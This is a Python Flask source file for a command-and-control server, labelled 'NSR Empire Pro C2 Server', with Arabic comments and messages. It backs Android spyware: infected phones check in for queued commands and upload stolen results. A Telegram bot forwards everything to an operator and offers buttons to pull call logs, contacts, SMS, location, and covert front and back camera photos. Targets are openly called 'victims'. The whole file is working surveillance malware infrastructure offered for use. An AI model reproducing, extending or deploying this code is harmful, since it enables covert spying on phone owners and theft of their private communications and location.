import os
import logging
import threading
import time
from flask import Flask, request, jsonify
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
ADMIN_ID = os.environ.get('ADMIN_ID', '')

bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML') if BOT_TOKEN else None

# تخزين متطور للأجهزة مع تتبع آخر ظهور (Timestamp)
connected_devices = {}
pending_commands = {}

@app.route('/')
def index():
    return jsonify({
        "status": "online",
        "system": "NSR Empire Pro C2 Server",
        "version": "7.11"
    }), 200

# نقطة الاتصال وتثبيت الجهاز في القائمة النشطة
@app.route('/api/v1/stream', methods=['POST', 'GET'])
@app.route('/api/connect', methods=['POST'])
def agent_connect():
    try:
        data = request.json if request.is_json else request.form.to_dict()
        device_id = data.get('device_id', 'Android_Device_Client') if data else 'Android_Device_Client'
        
        is_new_device = device_id not in connected_devices
        # تحديث وقت آخر اتصال للجهاز لضمان بقائه في القائمة النشطة
        connected_devices[device_id] = {
            "data": data or {"status": "connected"},
            "last_seen": time.time()
        }
        
        if is_new_device and bot and ADMIN_ID:
            markup = InlineKeyboardMarkup()
            markup.row(
                InlineKeyboardButton("📞 المكالمات", callback_data=f"cmd:{device_id}:get_calls"),
                InlineKeyboardButton("👥 الأسماء", callback_data=f"cmd:{device_id}:get_contacts")
            )
            markup.row(
                InlineKeyboardButton("💬 الرسائل", callback_data=f"cmd:{device_id}:get_sms"),
                InlineKeyboardButton("📍 الموقع", callback_data=f"cmd:{device_id}:get_location")
            )
            markup.row(
                InlineKeyboardButton("📸 كاميرا أمامية", callback_data=f"cmd:{device_id}:take_photo_front"),
                InlineKeyboardButton("📷 كاميرا خلفية", callback_data=f"cmd:{device_id}:take_photo_back")
            )
            bot.send_message(
                ADMIN_ID,
                f"🚨 <b>تم رصد وسيط جديد والسيطرة عليه!</b>\n\n"
                f"📱 <b>المعرف:</b> <code>{device_id}</code>",
                reply_markup=markup
            )
        
        # سحب الأمر المعلق وإرساله للعميل
        command_to_execute = pending_commands.pop(device_id, "wait")
        return jsonify({"status": "success", "command": command_to_execute}), 200
    except Exception as e:
        logger.error(f"Connect error: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/report', methods=['POST'])
def agent_report():
    try:
        data = request.json
        if not data:
            return jsonify({"error": "No data"}), 400
            
        device_id = data.get('device_id', 'Unknown')
        task_type = data.get('task_type', 'General')
        content = data.get('content', 'No content')
        
        if bot and ADMIN_ID:
            bot.send_message(
                ADMIN_ID,
                f"📥 <b>نتيجة مهمة ({task_type})</b>\n\n"
                f"👤 <b>الضحية:</b> <code>{device_id}</code>\n\n"
                f"📦 <code>{str(content)[:3500]}</code>"
            )
        return jsonify({"status": "received"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/upload', methods=['POST'])
def agent_upload():
    try:
        device_id = request.form.get('device_id', 'Unknown')
        task_type = request.form.get('task_type', 'File')
        
        if 'file' in request.files:
            file = request.files['file']
            filename = file.filename or 'media_file.bin'
            file_bytes = file.read()
            
            if bot and ADMIN_ID:
                bot.send_message(
                    ADMIN_ID,
                    f"📁 <b>تم استلام ملف/وسائط بنجاح!</b>\n"
                    f"👤 <b>الجهاز:</b> <code>{device_id}</code>\n"
                    f"📂 <b>النوع:</b> <code>{task_type}</code>"
                )
                bot.send_document(ADMIN_ID, (filename, file_bytes))
        return jsonify({"status": "uploaded"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if bot:
    @bot.message_handler(commands=['start', 'help'])
    def send_welcome(message):
        if str(message.from_user.id) != str(ADMIN_ID):
            return
        bot.reply_to(message, "👑 <b>لوحة تحكم إمبراطورية NSR C2 الفعالة</b>\n\nاستخدم الأمر /devices لعرض الأجهزة المتصلة وتحكم بها عبر الأزرار المباشرة.")

    @bot.message_handler(commands=['devices'])
    def list_devices(message):
        if str(message.from_user.id) != str(ADMIN_ID):
            return
            
        # تنظيف الأجهزة التي انقطع اتصالها لأكثر من 5 دقائق
        current_time = time.time()
        active_devs = {k: v for k, v in connected_devices.items() if current_time - v['last_seen'] < 300}
        
        if not active_devs:
            bot.reply_to(message, "⚠️ لا توجد أجهزة متصلة حالياً في الذاكرة المؤقتة.")
            return
            
        for dev_id in active_devs.keys():
            markup = InlineKeyboardMarkup()
            markup.row(
                InlineKeyboardButton("📞 المكالمات", callback_data=f"cmd:{dev_id}:get_calls"),
                InlineKeyboardButton("👥 الأسماء", callback_data=f"cmd:{dev_id}:get_contacts")
            )
            markup.row(
                InlineKeyboardButton("💬 الرسائل", callback_data=f"cmd:{dev_id}:get_sms"),
                InlineKeyboardButton("📍 الموقع", callback_data=f"cmd:{dev_id}:get_location")
            )
            markup.row(
                InlineKeyboardButton("📸 كاميرا أمامية", callback_data=f"cmd:{dev_id}:take_photo_front"),
                InlineKeyboardButton("📷 كاميرا خلفية", callback_data=f"cmd:{dev_id}:take_photo_back")
            )
            bot.send_message(
                message.chat.id,
                f"💀 <b>الضحية النشطة:</b> <code>{dev_id}</code>",
                reply_markup=markup
            )

    @bot.callback_query_handler(func=lambda call: True)
    def callback_query(call):
        if str(call.from_user.id) != str(ADMIN_ID):
            return
        data_parts = call.data.split(":")
        if len(data_parts) == 3 and data_parts[0] == "cmd":
            target_id = data_parts[1]
            command_str = data_parts[2]
            
            pending_commands[target_id] = command_str
            bot.answer_callback_query(call.id, f"تم حقن الأمر: {command_str}")
            bot.send_message(
                call.message.chat.id,
                f"🚀 <b>تم إرسال الأمر للضحية <code>{target_id}</code>:</b> <code>{command_str}</code>\n⏳ سيتم التنفيذ فور اتصال الجهاز بالسيرفر."
            )

    def run_bot():
        try:
            bot.infinity_polling(skip_pending=True)
        except Exception as e:
            logger.error(f"Bot error: {e}")

    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
